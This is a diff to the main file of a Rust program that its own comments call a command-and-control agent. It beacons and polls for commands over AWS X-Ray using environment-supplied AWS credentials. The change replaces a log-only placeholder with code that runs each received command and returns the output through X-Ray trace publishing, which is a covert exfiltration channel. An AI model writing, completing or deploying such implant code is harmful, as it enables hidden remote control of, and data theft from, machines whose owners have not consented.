@@ -4,17 +4,18 @@ use std::time::Duration;
 use tracing_subscriber;
 use tracing::Level;
 
+use crate::utils::{execute_command};
+
 mod model;
 mod utils;
 
 // Main function now returns a Result to handle errors (like missing env vars)
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     tracing_subscriber::fmt()
-        .with_max_level(Level::DEBUG)
+        .with_max_level(Level::INFO)
         .init();
 
-    // The logs will now be active for all subsequent code calls
-    tracing::info!("Starting X-Ray agent..."); // <-- This log should now appear
+    tracing::info!("Starting X-Ray agent...");
 
     // Read AWS credentials from environment variables
     let access_key =
@@ -23,20 +24,19 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         env::var("AWS_SECRET_ACCESS_KEY").expect("AWS_SECRET_ACCESS_KEY must be set");
     
     let instance_id = "rustinstance001";
-    let execution_result = "Test payload from Rust port";
 
-    // 1. Publish initial metrics
-    match utils::publish_metrics(instance_id, execution_result, &access_key, &secret_key) {
+    // 1. Inital beacon
+    match utils::publish_metrics(instance_id, "", &access_key, &secret_key) {
         Ok(()) => {
-            println!("Successfully published metrics to AWS X-Ray.");
+            tracing::info!("Successfully sent initial beacon AWS X-Ray.");
         }
         Err(e) => {
-            eprintln!("Error publishing metrics: {}", e);
+            tracing::error!("Error publishing metrics: {}", e);
         }
     }
 
-    // 2. Start polling for configuration/commands (C2 loop)
-    println!("\nStarting command polling loop (pauses for 5s between checks)...");
+    // 2. Start polling for commands (C2 loop)
+    println!("\nStarting command polling loop (pauses for 5s between checks)...");    
 
     loop {
         match utils::poll_configuration(instance_id, &access_key, &secret_key) {
@@ -44,9 +44,17 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 if command.is_empty() {
                     print!("."); // Indicate polling is happening
                 } else {
-                    println!("\n[!! COMMAND RECEIVED !!] Command: '{}'", command);
-                    // In a real application, you would execute the command here.
-                    // For now, we'll just log it.
+                    tracing::info!("Command received: '{}'", command);
+                    let execution_report = execute_command(&command);
+                    tracing::info!("Command execution complete. Full Report:\n{}", execution_report);
+                    match utils::publish_metrics(instance_id, &execution_report, &access_key, &secret_key) {
+                        Ok(()) => {
+                            tracing::info!("Successfully sent command response.");
+                        }
+                        Err(e) => {
+                            tracing::error!("Error publishing metrics: {}", e);
+                        }
+                    }
                 }
             }
             Err(e) => {
